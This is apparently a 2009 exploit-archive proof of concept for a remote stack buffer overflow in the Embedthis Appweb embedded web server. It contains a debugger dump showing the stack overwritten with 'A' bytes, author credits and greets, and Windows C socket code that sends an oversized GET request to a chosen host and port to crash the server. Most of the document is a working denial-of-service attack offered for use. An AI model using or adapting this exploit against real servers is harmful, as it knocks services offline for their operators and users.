    /***************************************************************************************
    Embedthis Appweb Remote Stack Buffer Overflow Poc
    Embedthis Appweb Debugging Info
    -------------------------------

    ASM INSTRUCTIONS
    ----------------
    100076CD   8B0A             MOV ECX,DWORD PTR DS:[EDX]
    100076CF   8B50 10          MOV EDX,DWORD PTR DS:[EAX+10]
    100076D2   51               PUSH ECX
    100076D3   52               PUSH EDX
    100076D4   68 14040110      PUSH libappwe.10010414                   ; ASCII "%s %s %s"
    100076D9   55               PUSH EBP
    100076DA   E8 29630000      CALL <JMP.&libmpr.mprPutFmtToBuf>

    DS:[00000000]=???
    ECX=00000000

    CPU Registers
    --------------
    EAX 01550080
    ECX 00000000
    EDX 00000000
    EBX 00000072
    ESP 0012FD08
    EBP 01550598
    ESI 00837567 ASCII "" %>s %b"
    EDI 01320080
    EIP 100076CD libappwe.100076CD
    C 1  ES 0023 32bit 0(FFFFFFFF)
    P 0  CS 001B 32bit 0(FFFFFFFF)
    A 1  SS 0023 32bit 0(FFFFFFFF)
    Z 0  DS 0023 32bit 0(FFFFFFFF)
    S 1  FS 003B 32bit 7FFDF000(FFF)
    T 0  GS 0000 NULL
    D 0
    O 0  LastErr ERROR_MOD_NOT_FOUND (0000007E)
    EFL 00000293 (NO,B,NE,BE,S,PO,L,LE)
    ST0 empty -??? FFFF 00000000 144C1A7A
    ST1 empty -??? FFFF 00000000 109C62C7
    ST2 empty -??? FFFF 0F3C475C 45A4876F
    ST3 empty -??? FFFF 109C62C7 41264D5E
    ST4 empty -??? FFFF 09AC2DB5 50CE16BD
    ST5 empty -??? FFFF 00000000 17D51378
    ST6 empty 0.0
    ST7 empty 0.0
               3 2 1 0      E S P U O Z D I
    FST 0007  Cond 0 0 0 0  Err 0 0 0 0 0 1 1 1  (GT)
    FCW 027F  Prec NEAR,53  Mask    1 1 1 1 1 1

    Stack
    ------
    <---------------Corruption starts here
    0012FBB8   41414141  AAAA
    0012FBBC   41414141  AAAA
    0012FBC0   41414141  AAAA
    0012FBC4   41414141  AAAA
    0012FBC8   41414141  AAAA
    0012FBCC   41414141  AAAA
    0012FBD0   41414141  AAAA
    0012FBD4   41414141  AAAA
    0012FBD8   41414141  AAAA
    0012FBDC   41414141  AAAA
    0012FBE0   41414141  AAAA
    0012FBE4   41414141  AAAA
    0012FBE8   41414141  AAAA
    0012FBEC   41414141  AAAA
    0012FBF0   41414141  AAAA
    0012FBF4   41414141  AAAA
    0012FBF8   41414141  AAAA
    0012FBFC   41414141  AAAA
    0012FC00   41414141  AAAA
    0012FC04   41414141  AAAA
    0012FC08   41414141  AAAA
    0012FC0C   41414141  AAAA
    0012FC10   41414141  AAAA
    0012FC14   41414141  AAAA
    0012FC18   41414141  AAAA
    0012FC1C   41414141  AAAA
    0012FC20   41414141  AAAA
    0012FC24   41414141  AAAA
    0012FC28   7C91005D  ].â€˜|  ntdll.7C91005D
.
    0012FC30   00000000  ....
    0012FC34   0002075C  \ .  UNICODE "\Embedthis Appweb\bin\appweb.exe"
    0012FC38   00000000  ....
    0012FC3C   00000000  ....
    0012FC40   00000000  ....
    Seh chain 
    ----------
    SEH chain of main thread, item 2
    Address=0012FFB0
    SE handler=appweb.004020B5
    Software info
    --------------
    Appweb is an embedded web server for the efficient hosting of web applications and frameworks. 
    It is blazing fast and has an extensive set of features. Appweb is optimized for hosting dynamic 
    web applications via an event-driven, multi-threaded core to deliver rapid response, fast throughput
    and effective memory utilization. It is compact and will embed using as little as 800K of memory......
    http://www.embedthis.com/products/appweb/embedded-web-server.html
    Download product
    -----------------
    http://www.embedthis.com/downloads/appweb/index.html
    Scenario
    ---------
    A stack buffer overflow occurs when a very long link is sent
    Bug type
    --------
    Buffer Overflow
    HTTP Dos
    Timeline
    --------
    8:08:2009
    Vendor
    -------
    -
    POC
    ----
    Filename
    ---------
    embed.cpp
    Compiler 
    ---------
    Dev-cpp 4.9.9.2
    Credits/Author
    ---------------
    fl0 fl0w
    Greets
    ------
    Hello to my friendz at 
    http://www.skullbox.info 
    www.doyourself.org 
    http://insecurity-ro.org 
   !_30,OSHO,Carcabot,Vlad,Marsu,Expanders,str0ke...
    References
    ----------
    http://sploitz.110mb.com
    DEMO
    ----
    ***********************************************************************
    Embedthis Appweb Remote Stack Overflow POC
    All Credits:fl0 fl0w
    http://www.sploitz.10001mb.com
    ******************************************************************************
    Usage:project1.exe [-h](host) [-p](port) Default Port 80 Default Host 127.0.0.1

    -h       host HTTP server
    -p       port HTTP server

    ------------------------------------------
    You can use the following IP addresses
    Host name is DESKTOP.
    Address 0:192.168.1.2
    ------------------------------------------
    Host name is DESKTOP.
    Address 1:79.119.103.68
    ------------------------------------------
    */
    //START of algorithm
    #include "winsock2.h"
    #include "fstream.h"
    #include <iostream.h>
    #include <getopt.h>
    #pragma comment(lib, "ws2_32")
    #define BUFFERSIZE 900000
    #define DEFAULT_PORT 80
    #define DEFAULT_HOST "127.0.0.1"
    #define COMMAND "GET "

    struct {
                        int  ip;
                        int port;
       }Net;
       
    static char buffer[BUFFERSIZE];
    WSADATA wsadata;
    int doit(int ,char**);
    void Exit(int);
    void Menu(int ,char**);
    void Wait_s(int);
    void Banner();
 
int main(int argc,char *argv[])
{   if (WSAStartup(MAKEWORD(2,0),&wsadata)!= 0){
    printf("%s", WSAGetLastError());
    return -1;
                                               }
    if(argc < 2) {
    system("CLS");     
    Banner();     
    Menu(argc, argv); 
    int a = doit(argc, argv);
    printf("%d", a);
            }
    else {
          int c;
          while((c = getopt(argc, argv, "h:p:o")) != EOF) {
          switch(c) {
                case 'h':
                Net.ip = (int)optarg;
                break;  
                case 'p': 
                Net.port = (int)optarg;
                break; 
                default:
                Banner();               
                }   
                }
                }     
	Net.ip = htonl(inet_addr(argv[1]));
	if (argc == 2){
    Net.port = atoi(argv[2]);
                  }
    else Net.port = DEFAULT_PORT;
    if(!Net.ip || !Net.port) {
    printf("IP && Port not good\n"); 
    Exit(-2);         
                            }
	SOCKET s;
	struct fd_set mask;
	struct timeval timeout; 
	struct sockaddr_in server;
	s = socket(AF_INET,SOCK_STREAM,0);
	if (s == INVALID_SOCKET) { 
    WSAGetLastError();
    WSACleanup();
    return -1;
                             }
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = htonl(Net.ip);
	server.sin_port = htons(Net.port);
	WSAConnect(s,(struct sockaddr *)&server,sizeof(server),NULL,NULL,NULL,NULL);
	timeout.tv_sec =  3;
    timeout.tv_usec = 0;
    FD_ZERO(&mask);
    FD_SET(s,&mask);
	switch(select(s+1,NULL,&mask,NULL,&timeout)) {
	case -1: {
    WSAGetLastError();
    closesocket(s);
    return -1;
                 }
	case 0:  {
    closesocket(s);
    return -1;
                 }
	default:
	if(FD_ISSET(s,&mask)) {
	printf("\tConnected\n");
	Wait_s(1000);
	int a, Load;
	Load=1787;
	memset(buffer,0,sizeof(buffer));
	strcat(buffer, COMMAND);
	for (a=0;a<Load;a++){strcat(buffer,"\x41");}
	strcat(buffer," HTTP/1.1\r\n\r\n");
	Wait_s(1000);
    if (send(s,buffer,strlen(buffer),0)==SOCKET_ERROR) { 
    printf("\tPayload not sent ! Server is OFF! \n");
    return -1;
                                                       }
	Wait_s(1000);
	printf("\tPayload sent ! HTTP server is DOWN !\n");
	return 0;
		}
	}
	closesocket(s);
	WSACleanup();
	return 0;
}

void Wait_s(int seconds)
 { Sleep (seconds);  
 }
 
int doit(int, char **)
 {
    char ac[80];
    if (gethostname(ac, sizeof(ac)) == SOCKET_ERROR) {
        printf("Error " , WSAGetLastError());
        return 1;
                                                     }

    struct hostent *phe = gethostbyname(ac);
    if (phe == 0) {
        printf("Bad host lookup.\n");
        return 1;
                   }
    printf("------------------------------------------\n");
    printf("You can use the following IP addresses\n");
    for (int i = 0; phe->h_addr_list[i] != 0; ++i) {
    struct in_addr addr;
    memcpy(&addr, phe->h_addr_list[i], sizeof(struct in_addr));
    printf("\n");
    printf("Host name is %s.\n" ,ac);
    printf("Address %d:%s\n" ,i ,inet_ntoa(addr));
    printf("------------------------------------------\n");
    }
    
    return 0;
 }
void Exit(int t)
 {  exit(t); 
 }  
  
void Menu(int argc, char **argv)
 { fprintf(stderr,
    "Usage:%s [-h](host) [-p](port) Default Port %d Default Host %s\n"
    "\n"
    "-h       host HTTP server\n"
    "-p       port HTTP server\n"
    "\n"
   ,
   argv[0],
   DEFAULT_PORT,
   DEFAULT_HOST);
     }
void Banner()
 { fputs("******************************************************************************\n"
    "Embedthis Appweb Remote Stack Overflow POC\n"
    "All Credits:fl0 fl0w\n"
   "\thttp://www.sploitz.10001mb.com\n"
   "******************************************************************************\n"
   ,stdout);
 }

// milw0rm.com [2009-08-11]
